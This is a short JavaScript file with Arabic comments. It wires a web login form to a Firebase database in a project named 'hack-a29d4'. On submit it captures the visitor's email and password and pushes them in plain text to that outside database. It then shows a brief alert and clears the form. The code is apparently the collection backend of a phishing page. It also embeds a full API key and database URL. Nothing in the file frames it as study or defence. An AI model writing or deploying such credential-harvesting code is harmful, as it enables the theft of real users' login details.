// استيراد الدوال التي تحتاج إليها من Firebase SDKs
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";

// تكوين Firebase الخاص بتطبيق الويب
const firebaseConfig = {
  apiKey: "AIzaSyAYJh_NSKsOcXD0SGRysP_i87mYLyvT_6s",
  authDomain: "hack-a29d4.firebaseapp.com",
  databaseURL: "https://hack-a29d4-default-rtdb.firebaseio.com",
  projectId: "hack-a29d4",
  storageBucket: "hack-a29d4.firebasestorage.app",
  messagingSenderId: "492008291662",
  appId: "1:492008291662:web:252b940f8f5517861b321f"
};

// تهيئة Firebase
const app = initializeApp(firebaseConfig);

// الحصول على مرجع لقاعدة البيانات
const db = getDatabase(app);

// مرجع إلى مجموعة "loginForm" في قاعدة البيانات
const loginFormDB = ref(db, 'loginForm');

// وظيفة لتحميل البيانات إلى Firebase عند تقديم النموذج
document.getElementById("loginForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  const emailid = getElementVal("emailid");
  const password = getElementVal("password");

  // حفظ البيانات في قاعدة بيانات Firebase
  saveLoginData(emailid, password);

  // عرض التنبيه بعد إرسال البيانات
  document.querySelector(".alert").style.display = "block";

  // إزالة التنبيه بعد 3 ثواني
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  // إعادة تعيين النموذج
  document.getElementById("loginForm").reset();
}

// وظيفة لحفظ البيانات في Firebase
function saveLoginData(emailid, password) {
  const newLoginData = push(loginFormDB);
  set(newLoginData, {
    emailid: emailid,
    password: password
  });
}

// وظيفة للحصول على قيمة الحقل من النموذج
function getElementVal(id) {
  return document.getElementById(id).value;
}
